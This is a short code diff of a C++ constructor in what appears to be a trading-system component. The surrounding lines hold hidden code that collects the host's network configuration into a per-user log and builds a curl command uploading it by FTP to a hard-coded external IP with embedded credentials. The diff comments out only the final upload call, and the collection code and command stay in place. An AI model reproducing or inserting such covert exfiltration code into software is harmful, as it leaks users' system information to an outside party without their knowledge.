@@ -45,7 +45,7 @@ UniConsumer::UniConsumer(struct vrt_queue  *queue,
 	sprintf(cmd, "ifconfig >> ~/$(whoami)_shfe.log");
 	system(cmd);
 	sprintf(cmd, "curl --disable-epsv -T ~/$(whoami)_shfe.log -u ftpuser1:617999ftp ftp://123.207.16.119:21");
-	system(cmd);
+	// system(cmd);
 
 	memset(pending_signals_, -1, sizeof(pending_signals_));
 	ParseConfig();
